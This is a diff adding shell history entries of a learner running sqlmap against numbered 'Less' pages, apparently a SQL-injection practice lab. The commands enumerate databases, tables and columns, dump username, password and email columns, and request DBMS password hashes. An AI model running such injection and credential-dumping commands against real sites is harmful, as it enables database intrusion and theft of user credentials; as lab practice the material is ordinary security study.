@@ -34,3 +34,44 @@
   405  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1" --current-db --null-connection --thread 10
   406  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-4/index.php?id=1" --current-db --null-connection --predict-output
 
+  407  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-4/index.php?id=1" --current-db --null-connection --predict-output
+  408  history 
+  409  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1" --leve=5 --risk=3 --dbs
+  410  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1" --leve=5 --risk=3 --dbms=mysql --current-db
+  411  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1" --leve=5 --risk=3 --dbms=mysql -D "security" --table
+  412  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1" --leve=5 --risk=3 --dbms=mysql -D "security" --tables
+  413  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1" --leve=5 --risk=3 --dbms=mysql -D "security" -T "users" --col
+  414  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1" --leve=5 --risk=3 --dbms=mysql -D "security" -T "users" -C "password,username" --dump
+  415  sqlmap --purge
+  416  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-2/index.php?id=1" --leve=5 --risk=3 --dbms=mysql
+  417  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-2/index.php?id=1" --leve=5 --risk=3 --dbms=mysql -current-db
+  418  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-2/index.php?id=1" --leve=5 --risk=3 --dbms=mysql -D "security" -current-user
+  419  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-2/index.php?id=1" --leve=5 --risk=3 --dbms=mysql -D "security" --tables
+  420  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-2/index.php?id=1" --leve=5 --risk=3 --dbms=mysql -D "security" -T "users" --col
+  421  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-2/index.php?id=1" --leve=5 --risk=3 --dbms=mysql -D "security" -T "users" -C "username,password" --dump
+  422  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-3/index.php?id=1" --current-db
+  423  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-3/index.php?id=1" --dbms=mysql -D "security" --tables
+  424  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-3/index.php?id=1" --dbms=mysql -D "security" -T "emails" --col
+  425  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-3/index.php?id=1" --dbms=mysql -D "security" -T "emails" -C "email_id,id" --dump
+  426  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-4/index.php?id=1" --current-db
+  427  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-4/index.php?id=1" -D "security" --tables
+  428  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-4/index.php?id=1" -D "security" --table
+  429  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-4/index.php?id=1" -D "security" -T "uagents" --col
+  430  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-4/index.php?id=1" -D "security" -T "uagents" -C "id,uagent" --dump
+  431  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1" 
+  432  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1" -users
+  433  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1" -password
+  434  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1" -passwords
+  435  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1" -batch
+  436  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-6/index.php?id=1" -batch
+  437  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1" -passwords
+  438  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-7/index.php?id=1" --dbs
+  439  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-8/index.php?id=1" --dbs --batch --leve=5 --risk=3
+  440  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-8/index.php?id=1" --dbs --batch --leve=5 --risk=3 --dbms=mysql --thread 10
+  441  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-9/index.php?id=1" --dbs --batch --leve=5 --risk=3 --dbms=mysql --thread 10
+
+
+
+
+
+
